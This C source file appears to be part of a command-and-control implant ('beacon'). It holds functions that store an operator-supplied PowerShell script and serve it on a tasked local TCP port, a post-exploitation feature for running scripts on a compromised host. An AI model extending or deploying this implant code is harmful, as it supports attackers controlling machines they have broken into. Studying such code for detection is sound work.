#include "pch.h"

#include "powershell.h"

#include "beacon.h"
#include "web_response.h"

char* gImportedPshScript;

char* PowershellImport(char* buffer, int size)
{
	if (gImportedPshScript)
		free(gImportedPshScript);

	gImportedPshScript = (char*)malloc(size + 1);
	memcpy(gImportedPshScript, buffer, size);
	gImportedPshScript[size] = 0;
	return gImportedPshScript;
}

void PowershellHostTcp(char* buffer, int size)
{
	if(!gImportedPshScript)
		return;

	datap parser;
	BeaconDataParse(&parser, buffer, size);
	short port = BeaconDataShort(&parser);
	WebServerInit(port, gImportedPshScript, strlen(gImportedPshScript));
}